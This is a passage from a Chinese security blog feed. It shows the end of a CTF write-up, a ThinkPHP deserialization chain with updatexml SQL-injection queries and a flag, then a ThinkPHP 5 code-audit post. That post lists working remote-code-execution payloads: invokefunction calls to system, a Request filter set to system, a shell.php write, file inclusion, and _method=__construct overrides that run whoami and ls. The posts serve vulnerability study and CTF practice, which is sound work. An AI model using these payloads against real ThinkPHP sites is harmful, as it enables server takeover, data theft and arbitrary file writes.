        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Mysql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;where&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;table&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,substr((select f14g from tp.f14g),32,64),0x7e),1)#&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;where&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1=1&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Image\Driver\Imagick&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;poc中查库查表语句如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;schema_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;schemata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;f14g&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202541147.png&#34; alt=&#34;image-20210402202541147&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202206988.png&#34; alt=&#34;image-20210402202206988&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202149998.png&#34; alt=&#34;image-20210402202149998&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202043924.png&#34; alt=&#34;image-20210402202043924&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202110500.png&#34; alt=&#34;image-20210402202110500&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;flag{07d47ce4-b5de-4671-9cdf-568fb9ec822f}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>thinkphp5代码审计</title>
        <link>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
        <pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg" alt="Featured image of post thinkphp5代码审计" /&gt;&lt;p&gt;本篇博文会复现大多数tp5的漏洞，持续更新&lt;/p&gt;
&lt;h2 id=&#34;审计环境搭建&#34;&gt;审计环境搭建&lt;/h2&gt;
&lt;h3 id=&#34;安装thinkphp&#34;&gt;安装thinkphp&lt;/h3&gt;
&lt;p&gt;推荐使用composer，版本切换很方便&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将 composer.json 文件的 require 字段设置成如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;require&amp;quot;: {
    &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;,
    &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot;
},
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行 &lt;code&gt;composer update&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpstormxdebug调试环境&#34;&gt;PhpStorm+Xdebug调试环境&lt;/h3&gt;
&lt;p&gt;可以看我另外一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://anthem-whisper.github.io/p/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Debian下PHP Xdebug调试环境搭建&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另外VSCode+Xdebug也是一个不错且方便的选择&lt;/p&gt;
&lt;h2 id=&#34;框架基本流程&#34;&gt;框架基本流程&lt;/h2&gt;
&lt;p&gt;框架基本流程网上都讲的很清楚，我这里就不搬运了&lt;/p&gt;
&lt;p&gt;这两篇文章讲的很不错：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/888/#_4&#34;&gt;https://paper.seebug.org/888/#_4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8143&#34;&gt;https://xz.aliyun.com/t/8143&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce-类名解析导致任意类方法调用&#34;&gt;RCE-类名解析导致任意类方法调用&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md&#34;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/888/#poc&#34;&gt;https://paper.seebug.org/888/#poc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3570&#34;&gt;https://xz.aliyun.com/t/3570&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;概述&#34;&gt;概述&lt;/h3&gt;
&lt;p&gt;本次漏洞存在于 &lt;strong&gt;ThinkPHP&lt;/strong&gt; 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 &lt;strong&gt;远程代码执行漏洞&lt;/strong&gt; 的产生。漏洞影响版本： &lt;strong&gt;5.0.7&amp;lt;=ThinkPHP5&amp;lt;=5.0.22&lt;/strong&gt; 、&lt;strong&gt;5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.30&lt;/strong&gt;。不同版本 &lt;strong&gt;payload&lt;/strong&gt; 需稍作调整：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.1.x&lt;/strong&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd
?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt;
?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt;
?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5.0.x&lt;/strong&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息
?s=index/\think\Lang/load&amp;amp;file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&amp;amp;file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;51x类名解析&#34;&gt;5.1.x类名解析&lt;/h3&gt;
&lt;p&gt;2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150300.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;洞其实不在这里&lt;/p&gt;
&lt;p&gt;在路由调度的时候：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150307.png&#34; alt=&#34;image-20210224183737791&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;跟进到thinkphp/library/think/route/dispatch/Module.php:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150311.png&#34; alt=&#34;image-20210224183857202&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;跟进controller方法：(thinkphp/library/think/App.php)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150328.png&#34; alt=&#34;image-20210224193234503&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150405.png&#34; alt=&#34;image-20210222221052520&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这个方法先对&lt;code&gt;$name&lt;/code&gt;(类名)进行判断，当&lt;code&gt;$name&lt;/code&gt;含有&lt;code&gt;\&lt;/code&gt;时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;thinkphp/library/think/Container.php：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150430.png&#34; alt=&#34;image-20210223112805010&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index/think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过自动加载的特性，&lt;code&gt;think\Container&lt;/code&gt;可以直接调用thinkphp/library/think/Container.php的危险方法&lt;code&gt;invokefunction&lt;/code&gt;，造成RCE。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;thinkphp/library/think/Request.php:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150418.png&#34; alt=&#34;image-20210223113330871&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;因为是private，所以查找同一类里面的用例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Request::input方法：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150443.png&#34; alt=&#34;image-20210223113649493&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;构造poc：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index/think\request/input&amp;amp;data=1&amp;amp;filter=phpinfo&amp;amp;name=
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Request::cookie方法：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150457.png&#34; alt=&#34;image-20210223114040419&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;构造poc：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\request/cookie&amp;amp;name=cmd&amp;amp;filter=phpinfo
[HTTP header]
Cookie: cmd=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同样成功RCE。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;thinkphp/library/think/template/driver/File.php:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150511.png&#34; alt=&#34;image-20210223130238959&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;构造poc：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\template\driver\file/write&amp;amp;cacheFile=/tmp/test.txt&amp;amp;content=hacked
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功写入/tmp/test.txt文件。&lt;/p&gt;
&lt;h3 id=&#34;50x类名解析&#34;&gt;5.0.x类名解析&lt;/h3&gt;
&lt;p&gt;thinkphp/library/think/Loader.php:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150528.png&#34; alt=&#34;image-20210224104838156&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;原理类似，在&lt;code&gt;App::run()&lt;/code&gt;方法里面，&lt;code&gt;Loader::controller&lt;/code&gt;进行调度的时候，当&lt;code&gt;$name&lt;/code&gt;含有&lt;code&gt;\&lt;/code&gt;时会直接将其作为类的命名空间路径，导致我们可以任意方法调用。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;thinkphp/library/think/App.php:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150543.png&#34; alt=&#34;image-20210224111256654&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;构造poc:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=assert&amp;amp;vars[1][]=phpinfo()
http://127.0.0.1/public/?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;eval因为不是函数不能直接回调，在特定php版本情况下可以使用assert直接RCE，或者利用其他函数读写文件。&lt;/p&gt;
&lt;h3 id=&#34;需要注意的问题&#34;&gt;需要注意的问题&lt;/h3&gt;
&lt;p&gt;在https://xz.aliyun.com/t/3570#toc-3这篇文章里面提到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为默认配置会判断是否自动转换控制器，将控制器名变成小写&lt;/p&gt;
&lt;p&gt;又因为&lt;code&gt;Loader.php::autoloadwin&lt;/code&gt;在win环境下严格区分大小写，所以导致有些类加载不到&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是我在Kali下经过小写转换同样也没办法加载到，可能是因为Linux本来就区分大小写？&lt;/p&gt;
&lt;p&gt;如此一来，着手点只有框架在加载的时候就已经加载的类了&lt;/p&gt;
&lt;h2 id=&#34;rce-request核心类变量覆盖&#34;&gt;RCE-Request核心类变量覆盖&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ThinkPHP版本：5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.23 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.30&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md&#34;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;概述-1&#34;&gt;概述&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210416105559.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Request核心类**$method** 来自可控的 **$_POST** 数组，而且在获取之后没有进行任何检查，直接把它作为 **Request** 类的方法进行调用，同时，该方法传入的参数是可控数据 **$_POST** 。导致可以随意调用 **Request** 类的部分方法&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://php.local/thinkphp5.0.5/public/index.php?s=index
post
_method=__construct&amp;amp;method=get&amp;amp;filter[]=call_user_func&amp;amp;get[]=phpinfo
_method=__construct&amp;amp;filter[]=system&amp;amp;method=GET&amp;amp;get[]=whoami

# ThinkPHP &amp;lt;= 5.0.13
POST /?s=index/index
s=whoami&amp;amp;_method=__construct&amp;amp;method=&amp;amp;filter[]=system

# ThinkPHP &amp;lt;= 5.0.23、5.1.0 &amp;lt;= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&amp;amp;filter[]=system&amp;amp;server[REQUEST_METHOD]=ls -al

# ThinkPHP &amp;lt;= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=ls+-al
_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=ls
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5010变量覆盖&#34;&gt;5.0.10变量覆盖&lt;/h3&gt;
&lt;p&gt;测试用的payload（版本5.0.10）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index
POST:
_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在App::run()方法进行路由检测的时候，在Route.php大约843行调用&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;thinkphp/library/think/Request.php:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150559.png&#34; alt=&#34;image-20210308164140184&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可以看到有一个可以控制的函数名&lt;code&gt;$_POST[Config::get[&#39;var_method&#39;]&lt;/code&gt;，而&lt;code&gt;var_method&lt;/code&gt;的值在application/config.php里面为&lt;code&gt;_method&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150613.png&#34; alt=&#34;image-20210308164849228&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;于是可以POST传入&lt;code&gt;_method&lt;/code&gt;改变&lt;code&gt;$this-&amp;gt;{$this-&amp;gt;method}($_POST);&lt;/code&gt;达到任意调用此类中的方法&lt;/p&gt;
&lt;p&gt;而如果调用此类中的&lt;code&gt;__construct&lt;/code&gt;方法：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150623.png&#34; alt=&#34;image-20210308165349746&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;有一个foreach，可以引起POST数据对Requests对象属性的变量覆盖。&lt;/p&gt;
